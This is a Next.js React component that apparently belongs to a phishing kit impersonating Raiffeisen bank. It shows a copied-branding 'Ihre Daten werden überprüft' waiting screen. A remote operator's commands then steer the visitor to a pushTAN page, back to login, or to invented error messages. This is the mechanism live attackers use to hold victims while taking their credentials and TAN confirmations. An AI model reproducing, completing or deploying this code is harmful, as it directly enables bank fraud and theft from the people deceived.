"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Footer from "./Footer";
import HelpButton from "./HelpButton";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "forward_to_tan": {
          const code = (cmd.payload as { code?: string }).code || "";
          router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
          break;
        }
        case "back_to_login":
          router.push("/");
          break;
        case "show_error":
          setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/raiffeisen/bg-forest.jpg')",
        backgroundColor: "#2d5a27",
      }}
    >
      <main className="flex-1 flex flex-col justify-center items-center px-4 sm:px-0">
        <div className="relative bg-white rounded-lg w-full max-w-[460px] pt-[34px] mt-[34px] pb-6 flex flex-col shadow-lg">
          {/* Logo */}
          <div className="absolute -top-[34px] left-0 right-0 flex justify-center">
            <div
              className="w-[68px] h-[68px] bg-center bg-no-repeat"
              style={{ backgroundSize: "68px", backgroundImage: "url('/raiffeisen/raiffeisen-logo.svg')" }}
            />
          </div>

          {/* Content */}
          <div className="flex-1 mt-6 px-4 sm:px-6">
            {/* Error banner */}
            {error && (
              <div className="mb-4 rounded border border-raf-danger bg-red-50 px-4 py-3 text-sm text-raf-danger">
                {error}
              </div>
            )}

            {/* Spinner and text */}
            <div className="flex flex-col items-center py-10">
              <div
                className="w-12 h-12 rounded-full mb-6"
                style={{
                  border: "4px solid var(--raf-gray-300)",
                  borderTopColor: "var(--raf-primary)",
                  animation: "raf-spin 1s linear infinite",
                }}
              />
              <p className="text-xl font-normal text-raf-black mb-2">
                Ihre Daten werden {"ü"}berpr{"ü"}ft...
              </p>
              <p className="text-sm text-raf-text-secondary">
                Bitte warten Sie...
              </p>
            </div>
          </div>
        </div>
      </main>
      <Footer />
      <HelpButton />

      {/* Spinner keyframes */}
      <style>{`
        @keyframes raf-spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
